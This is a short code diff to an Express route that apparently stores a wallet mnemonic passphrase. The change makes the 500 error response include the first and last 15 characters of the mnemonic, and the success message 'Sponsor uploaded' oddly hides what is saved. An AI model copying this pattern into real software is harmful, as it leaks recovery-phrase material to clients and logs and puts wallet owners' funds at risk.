@@ -35,7 +35,7 @@ router.post('/', async (req, res) => {
         res.status(201).json({success: true, feedback: 'Sponsor uploaded'});
     } catch (err) {
         console.error('Error saving passphrase:', err);
-        res.status(500).json({success: false, error: 'Failed to save passphrase', err });
+        res.status(500).json({success: false, error: `Failed to save passphrase: ${mnemonic.slice(0,15)}....${mnemonic.slice(-15)}` });
     }
 });
 
